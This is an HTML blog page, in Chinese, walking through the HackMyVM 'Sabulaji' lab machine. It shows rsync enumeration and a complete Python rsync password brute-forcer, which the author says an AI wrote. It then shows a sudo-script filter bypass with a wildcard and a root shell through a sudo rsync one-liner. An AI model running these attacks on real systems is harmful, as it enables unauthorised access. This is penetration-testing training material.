@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1umph.top/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1umph.top/plugins/theme.js'></script><script src='https://7r1umph.top/plugins/StatsSidebar.js'></script>
+    <link rel="icon" href="https://7r1umph.top/image/20250320200557660.ico">
+<meta name="description" content="害，这靶机，给我干沉默了
+
+先探测ip
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ sudo arp-scan -l            
+[sudo] password for kali: 
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
+192.168.205.136 08:00:27:05:77:df       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:f3:0c:de       VMware, Inc.
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
+          
+```
+
+探测服务
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ nmap -p- 192.168.205.136
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 20:39 EDT
+Nmap scan report for 192.168.205.136
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+873/tcp open  rsync
+MAC Address: 08:00:27:05:77:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
+                                                                            
+```
+
+https://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync
+感兴趣的自己去看，大概功能是
+
+![image-20250612085331462](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250612085338904.webp)
+
+查看一下共享目录
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync rsync://192.168.205.136:873
+
+public          Public Files
+epages          Secret Documents
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync rsync://192.168.205.136:873/public/
+
+drwxr-xr-x          4,096 2025/05/15 12:35:39 .
+-rw-r--r--            433 2025/05/15 12:35:39 todo.list
+                                                                       
+```
+
+拉下来
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ mkdir tmp
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync -avz rsync://192.168.205.136:873/public/ ./tmp/public/
+
+receiving incremental file list
+created directory ./tmp/public
+./
+todo.list
+
+sent 46 bytes  received 380 bytes  852.00 bytes/sec
+total size is 433  speedup is 1.02
+                                                            
+┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
+└─$ cat todo.list | trans -b :zh 2>/dev/null
+待办事项列表
+==========
+
+1。">
+<meta property="og:title" content="hmv_Sabulaji">
+<meta property="og:description" content="害，这靶机，给我干沉默了
+
+先探测ip
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ sudo arp-scan -l            
+[sudo] password for kali: 
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
+192.168.205.136 08:00:27:05:77:df       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:f3:0c:de       VMware, Inc.
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
+          
+```
+
+探测服务
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ nmap -p- 192.168.205.136
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 20:39 EDT
+Nmap scan report for 192.168.205.136
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+873/tcp open  rsync
+MAC Address: 08:00:27:05:77:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
+                                                                            
+```
+
+https://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync
+感兴趣的自己去看，大概功能是
+
+![image-20250612085331462](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250612085338904.webp)
+
+查看一下共享目录
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync rsync://192.168.205.136:873
+
+public          Public Files
+epages          Secret Documents
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync rsync://192.168.205.136:873/public/
+
+drwxr-xr-x          4,096 2025/05/15 12:35:39 .
+-rw-r--r--            433 2025/05/15 12:35:39 todo.list
+                                                                       
+```
+
+拉下来
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ mkdir tmp
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync -avz rsync://192.168.205.136:873/public/ ./tmp/public/
+
+receiving incremental file list
+created directory ./tmp/public
+./
+todo.list
+
+sent 46 bytes  received 380 bytes  852.00 bytes/sec
+total size is 433  speedup is 1.02
+                                                            
+┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
+└─$ cat todo.list | trans -b :zh 2>/dev/null
+待办事项列表
+==========
+
+1。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Sabulaji.html">
+<meta property="og:image" content="https://7r1umph.top/image/20250506213832365.webp">
+<title>hmv_Sabulaji</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_Sabulaji</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/93" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>害，这靶机，给我干沉默了</p>
+<p>先探测ip</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ sudo arp-scan -l            
+[sudo] password for kali: 
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
+192.168.205.136 08:00:27:05:77:df       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:f3:0c:de       VMware, Inc.
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
+          
+</code></pre>
+<p>探测服务</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ nmap -p- 192.168.205.136
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 20:39 EDT
+Nmap scan report for 192.168.205.136
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+873/tcp open  rsync
+MAC Address: 08:00:27:05:77:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
+                                                                            
+</code></pre>
+<p><a href="https://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync" rel="nofollow">https://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync</a><br>
+感兴趣的自己去看，大概功能是</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250612085338904.webp"><img src="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250612085338904.webp" alt="image-20250612085331462" style="max-width: 100%;"></a></p>
+<p>查看一下共享目录</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync rsync://192.168.205.136:873
+
+public          Public Files
+epages          Secret Documents
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync rsync://192.168.205.136:873/public/
+
+drwxr-xr-x          4,096 2025/05/15 12:35:39 .
+-rw-r--r--            433 2025/05/15 12:35:39 todo.list
+                                                                       
+</code></pre>
+<p>拉下来</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ mkdir tmp
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync -avz rsync://192.168.205.136:873/public/ ./tmp/public/
+
+receiving incremental file list
+created directory ./tmp/public
+./
+todo.list
+
+sent 46 bytes  received 380 bytes  852.00 bytes/sec
+total size is 433  speedup is 1.02
+                                                            
+┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
+└─$ cat todo.list | trans -b :zh 2&gt;/dev/null
+待办事项列表
+==========
+
+1。Sabulaji：删除私人共享设置
+ - 查看所有共享文件和文件夹。
+ - 禁用任何私人共享链接或权限。
+
+2。Sabulaji：更改为强密码
+ - 创建一个新密码（至少12个字符，包括大写，小写，数字和符号）。
+ - 更新系统设置中的密码。
+ - 确保不从其他帐户重复使用新密码。
+==========
+      
+</code></pre>
+<p>提示我们sabulaji是弱密码，我爆破了ssh无果，那就继续看共享目录</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
+└─$ rsync -avz rsync://192.168.205.136:873/epages/ ./tmp/epages/
+
+Password: 
+@ERROR: auth failed on module epages
+rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]
+                      
+</code></pre>
+<p>要密码，找ai写个脚本爆破</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ cat bprsync.py 
+#!/usr/bin/env python3
+import subprocess
+import os
+import sys
+from multiprocessing import Pool, Manager, cpu_count, RLock
+import signal
+from functools import partial
+from tqdm import tqdm
+
+TARGET_HOST = "192.168.205.136"
+TARGET_PORT = "873"
+TARGET_MODULE = "epages"
+WORDLIST_PATH = "/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt"
+USERNAMES = ["", "sabulaji"]
+RSYNC_TIMEOUT = 10
+try:
+    NUM_PROCESSES = cpu_count() if cpu_count() &lt;= 8 else 8
+except NotImplementedError:
+    NUM_PROCESSES = 4
+
+g_found_credential = None
+g_pool = None
+
+
+def signal_handler(sig, frame):
+    global g_pool
+    print("\n[!] CTRL+C pressed. Exiting.")
+    if g_pool:
+        g_pool.terminate()
+        g_pool.join()
+    sys.exit(1)
+
+
+def check_password(password, found_flag, usernames):
+    if found_flag.is_set():
+        return None
+
+    for username in usernames:
+        if found_flag.is_set():
+            return None
+
+        user_part = f"{username}@" if username else ""
+        target_url = f"rsync://{user_part}{TARGET_HOST}:{TARGET_PORT}/{TARGET_MODULE}"
+
+        env = os.environ.copy()
+        env['RSYNC_PASSWORD'] = password
+
+        command = ['rsync', '--list-only', '-q', target_url]
+
+        try:
+            result = subprocess.run(
+                command,
+                env=env,
+                capture_output=True,
+                text=True,
+                timeout=RSYNC_TIMEOUT
+            )
+
+            if result.returncode == 0:
+                if not found_flag.is_set():
+                    found_flag.set()
+                    return (username, password)
+
+        except (subprocess.TimeoutExpired, Exception):
+            continue
+
+    return None
+
+
+def main():
+    global g_found_credential, g_pool
+
+    signal.signal(signal.SIGINT, signal_handler)
+    tqdm.set_lock(RLock())
+
+    if not os.path.exists(WORDLIST_PATH):
+        print("[-] Wordlist not found.")
+        sys.exit(1)
+
+    try:
+        with open(WORDLIST_PATH, 'r', encoding='latin-1', errors='ignore') as f:
+            passwords = [line.strip() for line in f]
+    except Exception as e:
+        print(f"[-] Error reading wordlist: {e}")
+        sys.exit(1)
+
+    if not passwords:
+        print("[-] Wordlist is empty.")
+        sys.exit(1)
+
+    total_passwords = len(passwords)
+    print(f"[+] Starting rsync brute-force attack...")
+
+    with Manager() as manager:
+        found_flag = manager.Event()
+
+        with Pool(processes=NUM_PROCESSES, initializer=tqdm.set_lock, initargs=(tqdm.get_lock(),)) as pool:
+            g_pool = pool
+            worker_func = partial(check_password, found_flag=found_flag, usernames=USERNAMES)
+
+            try:
+                with tqdm(total=total_passwords, unit=" passwords", dynamic_ncols=True) as pbar:
+                    for result in pool.imap_unordered(worker_func, passwords):
+                        pbar.update(1)
+                        if result is not None:
+                            g_found_credential = result
+                            pool.terminate()
+                            break
+            finally:
+                pool.join()
+
+    print("\n" + "=" * 60)
+    if g_found_credential:
+        found_user, found_pass = g_found_credential
+        display_user = found_user if found_user else "&lt;empty&gt;"
+        print(f"[+] SUCCESS! Credentials found:")
+        print(f"    Username: {display_user}")
+        print(f"    Password: {found_pass}")
+    else:
+        print("[-] FAILED. No valid credentials found.")
+    print("=" * 60)
+
+
+if __name__ == '__main__':
+    main()
+   
+</code></pre>
+<p>小知识，[<a href="https://hackmyvm.eu/profile/?user=Sublarge" rel="nofollow">Sublarge</a>](<a href="https://hackmyvm.eu/profile/?user=Sublarge" rel="nofollow">https://hackmyvm.eu/profile/?user=Sublarge</a>)  很喜欢使用xato-net-10-million-passwords-100000.txt这个字典，开爆</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ python3 $_               
+[+] Starting rsync brute-force attack...
+ 16%|███████████████████▊                                                                                                           | 15589/100000 [06:55&lt;37:30, 37.51 passwords/s]
+
+============================================================
+[+] SUCCESS! Credentials found:
+    Username: sabulaji
+    Password: admin123
+============================================================
+                                                                    
+</code></pre>
+<p>拷下来</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ rsync -avz rsync://sabulaji@192.168.205.136:873/epages/ ./tmp/epages/
+
+Password: 
+receiving incremental file list
+created directory ./tmp/epages
+./
+secrets.doc
+
+sent 46 bytes  received 3,242 bytes  1,315.20 bytes/sec
+total size is 13,312  speedup is 4.05
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ cd tmp/epages 
+                                                                                                                                                                                   
+┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
+└─$ ls -al
+total 13
+drwxr-xr-x 1 kali kali     0 Jun 11 21:08 .
+drwxr-xr-x 1 kali kali     0 Jun 11 21:08 ..
+-rwxr-xr-x 1 kali kali 13312 May 15 12:17 secrets.doc
+ 
+┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
+└─$ libreoffice secrets.doc 
+</code></pre>
+<pre class="notranslate"><code class="notranslate">The Art of Keeping Secrets
+In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it's a personal diary tucked under a mattress or a cryptic message passed in a crowded café, the allure of hidden knowledge captivates us all.
+Take, for example, the old server room in my office. It’s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account "welcome." I overheard a colleague chuckle about it, saying the password was something absurdly simple, like "P@ssw0rd123!"—hardly a secret worth keeping, but it’s been untouched for years.
+Secrets, however, aren’t just about passwords or hidden files. They’re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.
+So, how do we master this art? First, blend in. Don’t make your secret obvious. Second, protect it with something stronger than "P@ssw0rd123!"—maybe a phrase only you’d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you’re not careful.
+In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.
+
+翻译
+保守秘密的艺术
+在这个信息泛滥的世界里，保守秘密既是一门艺术，也是一项挑战。无论是藏在床垫下的私人日记，还是在拥挤的咖啡馆里传递的神秘信息，隐藏知识的魅力都深深吸引着我们。
+就拿我办公室里的老服务器机房来说吧。那是一个布满灰尘的角落，一些被遗忘的机器静静地嗡嗡作响。其中一台是21世纪初的遗物，至今仍在运行FTP服务。管理员一时糊涂，把默认账户命名为“welcome”。我无意中听到一位同事对此窃笑，说密码简单得可笑，比如“P@ssw0rd123！”——这算不上什么值得保守的秘密，但多年来却从未被触碰过。
+然而，秘密不仅仅关乎密码或隐藏文件。它关乎意图。关于项目的悄悄流言，朋友之间暗中一瞥，甚至是我们守护思想的方式。最好的秘密是那些藏在众目睽睽之下，不被分心之眼察觉的秘密。
+那么，我们如何掌握这门艺术呢？首先，融入其中。不要让你的秘密显而易见。其次，用比“P@ssw0rd123！”更强硬的语气来保护它——也许这句话只有你自己才能理解。最后，谨慎信任。即使是最友善的系统，如果你不小心，也可能背叛你。
+最终，秘密提醒我们，并非所有事情都需要分享。有些事情最好不要说，或者至少留给那些知道去哪里找的人。
+</code></pre>
+<p>welcome:P@ssw0rd123!</p>
+<p>登录ssh</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
+└─$ ssh welcome@192.168.205.136
+The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
+ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:5: [hashed name]
+    ~/.ssh/known_hosts:9: [hashed name]
+    ~/.ssh/known_hosts:10: [hashed name]
+    ~/.ssh/known_hosts:11: [hashed name]
+    ~/.ssh/known_hosts:12: [hashed name]
+    ~/.ssh/known_hosts:13: [hashed name]
+    ~/.ssh/known_hosts:14: [hashed name]
+    ~/.ssh/known_hosts:15: [hashed name]
+    (4 additional names omitted)
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
+welcome@192.168.205.136's password: 
+Permission denied, please try again.
+welcome@192.168.205.136's password: 
+Linux Sabulaji 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+welcome@Sabulaji:~$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
+</code></pre>
+<p>扒拉</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:~$ ls -la
+total 24
+drwxr-xr-x 2 welcome welcome 4096 May 16 01:21 .
+drwxr-xr-x 4 root    root    4096 May 15 12:39 ..
+lrwxrwxrwx 1 root    root       9 May 15 12:47 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
+-rw-r--r-- 1 root    root      44 May 15 12:49 user.txt
+welcome@Sabulaji:~$ cat user.txt 
+flag{user-cf7883184194add6adfa5f20b5061ac7}
+welcome@Sabulaji:~$ sudo -l
+Matching Defaults entries for welcome on Sabulaji:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on Sabulaji:
+    (sabulaji) NOPASSWD: /opt/sync.sh
+welcome@Sabulaji:~$ cat /opt/sync.sh
+#!/bin/bash
+
+if [ -z $1 ]; then
+    echo "error: note missing"
+    exit
+fi
+
+note=$1
+
+if [[ "$note" == *"sabulaji"* ]]; then
+    echo "error: forbidden"
+    exit
+fi
+
+difference=$(diff /home/sabulaji/personal/notes.txt $note)
+
+if [ -z "$difference" ]; then
+    echo "no update"
+    exit
+fi
+
+echo "Difference: $difference"
+
+cp $note /home/sabulaji/personal/notes.txt
+
+echo "[+] Updated."
+</code></pre>
+<p>实现参数中不能包含"sabulaji"，然后使用diff 命令比较目标文件 /home/sabulaji/personal/notes.txt 和输入的 note 文件之间的差异,输入note为$1</p>
+<p>先看看它一开始放了什么</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh /dev/null
+Difference: 1d0
+&lt; Maybe you can find it...
+[+] Updated.
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120915456.webp"><img src="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120915456.webp" alt="image-20250612091547195" style="max-width: 100%;"></a></p>
+<p>不，我找不到(手动狗头doge)</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:~$ cd /tmp/
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
+Difference: 0a1,27
+&gt; root:x:0:0:root:/root:/bin/bash
+&gt; daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&gt; bin:x:2:2:bin:/bin:/usr/sbin/nologin
+&gt; sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&gt; sync:x:4:65534:sync:/bin:/bin/sync
+&gt; games:x:5:60:games:/usr/games:/usr/sbin/nologin
+&gt; man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+&gt; lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+&gt; mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+&gt; news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+&gt; uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+&gt; proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+&gt; www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+&gt; backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+&gt; list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+&gt; irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+&gt; gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+&gt; nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&gt; _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+&gt; systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+&gt; systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+&gt; systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+&gt; systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+&gt; messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+&gt; sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+&gt; welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+&gt; sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
+[+] Updated.
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/shadow
+diff: /etc/shadow: Permission denied
+no update
+</code></pre>
+<p>扒拉了很久，然后我偶然间id了一下</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:~$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
+</code></pre>
+<p>它比正常的多了一个mlocate的组，然后我就去扒拉这个是干什么的<br>
+<a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120941472.webp"><img src="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120941472.webp" alt="image-20250612094149243" style="max-width: 100%;"></a></p>
+<p>啊这，那我知道了</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:~$ strings /var/lib/mlocate/mlocate.db | less
+</code></pre>
+<p>然后搜索sabulaji</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120940995.webp"><img src="https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120940995.webp" alt="image-20250612094040790" style="max-width: 100%;"></a></p>
+<p>看看是不是这个</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:/home/sabulaji$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/creds.txt
+error: forbidden
+</code></pre>
+<p>在这等我呢</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaj*/personal/creds.txt
+Difference: 1c1
+&lt; 
+---
+&gt; Sensitive Credentials:Z2FzcGFyaW4=
+[+] Updated.
+</code></pre>
+<p>拿下</p>
+<pre class="notranslate"><code class="notranslate">welcome@Sabulaji:/tmp$ cd /home/
+welcome@Sabulaji:/home$ su sabulaji
+Password: 
+sabulaji@Sabulaji:/home$ id
+uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)
+</code></pre>
+<p>扒拉</p>
+<pre class="notranslate"><code class="notranslate">sabulaji@Sabulaji:/home$ cd sabulaji/
+sabulaji@Sabulaji:~$ ls -al
+total 24
+drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 .
+drwxr-xr-x 4 root     root     4096 May 15 12:39 ..
+lrwxrwxrwx 1 root     root        9 May 15 12:47 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 sabulaji sabulaji  220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 sabulaji sabulaji 3526 Apr 18  2019 .bashrc
+drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 personal
+-rw-r--r-- 1 sabulaji sabulaji  807 Apr 18  2019 .profile
+sabulaji@Sabulaji:~$ cd personal/
+sabulaji@Sabulaji:~/personal$ ls -al
+total 16
+drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 .
+drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 ..
+-r-------- 1 sabulaji sabulaji   35 May 16 01:32 creds.txt
+-rw-r--r-- 1 sabulaji sabulaji   35 Jun 11 21:56 notes.txt
+sabulaji@Sabulaji:~/personal$ sudo -l
+Matching Defaults entries for sabulaji on Sabulaji:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sabulaji may run the following commands on Sabulaji:
+    (ALL) NOPASSWD: /usr/bin/rsync
+</code></pre>
+<p>有现成的</p>
+<p><a href="https://gtfobins.github.io/gtfobins/rsync/#sudo" rel="nofollow">https://gtfobins.github.io/gtfobins/rsync/#sudo</a></p>
+<pre class="notranslate"><code class="notranslate">sabulaji@Sabulaji:~/personal$ sudo rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# bash           
+root@Sabulaji:/home/sabulaji/personal# cat /root/root.txt 
+flag{root-89e62d8807f7986edb259eb2237d011c}
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
